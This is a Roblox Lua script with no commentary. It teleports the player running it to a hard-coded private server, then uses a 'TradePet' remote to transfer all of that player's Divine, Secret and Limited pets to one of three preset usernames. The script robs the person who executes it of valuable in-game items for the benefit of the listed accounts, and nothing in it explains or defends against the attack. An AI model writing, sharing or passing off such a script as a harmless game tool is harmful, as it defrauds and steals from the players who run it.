repeat wait() until game:IsLoaded()

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

local gameID = 126884695634066
local privateServerID = "19fa2ffd5b2f404494bc8c791a60c706"

pcall(function()
    TeleportService:TeleportToPrivateServer(gameID, privateServerID, {player})
end)

player.CharacterAdded:Wait()
repeat wait() until game:IsLoaded()
wait(5)

local targetRarities = { "Divine", "Secret", "Limited" }
local rarityKey = "Rarity"

local preferredUsers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if Players:FindFirstChild(name) then
        targetUser = name
        break
    end
end

local tradeRemote = ReplicatedStorage:FindFirstChild("TradePet")

if targetUser and tradeRemote and player:FindFirstChild("Pets") then
    for _, pet in ipairs(player.Pets:GetChildren()) do
        local rarity = pet:FindFirstChild(rarityKey)
        if rarity and table.find(targetRarities, rarity.Value) then
            tradeRemote:FireServer(targetUser, pet.Name)
        end
    end
else
    warn("❌ Missing target user, TradePet remote, or Pets folder.")
end
